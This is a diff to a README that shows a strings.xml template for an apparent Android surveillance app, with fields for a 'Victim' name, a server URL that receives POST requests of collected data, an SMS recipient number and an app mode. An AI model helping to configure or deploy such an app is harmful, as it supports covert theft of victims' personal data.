@@ -35,10 +35,13 @@ To set up the app, follow these steps:
 ```xml
 <resources>
     <string name="app_name">Your App Name</string>
-    <string name="victim">Name of victim to tag the received data</string>
-    <string name="server_url">Server URL where POST request is created</string>
-    <string name="SendSmsTo">Phone No</string>
-    <string name="Message">Message body</string>
+    <string name="Victim">Name of victim to tag the received data</string>
+    <string name="AppType">App type to generate (refer Changing App Modes) </string>
+    <string name="server_Url">Server URL where POST request is created</string>
+    <string name="SendSmsTo"> Phone No</string>
+    <string name="Message">test Message to check</string>
+    <string name="profile_image">Upload Profile Pic</string>
+    <string name="upload_image">Update Pic</string>
 </resources>
 ```
 
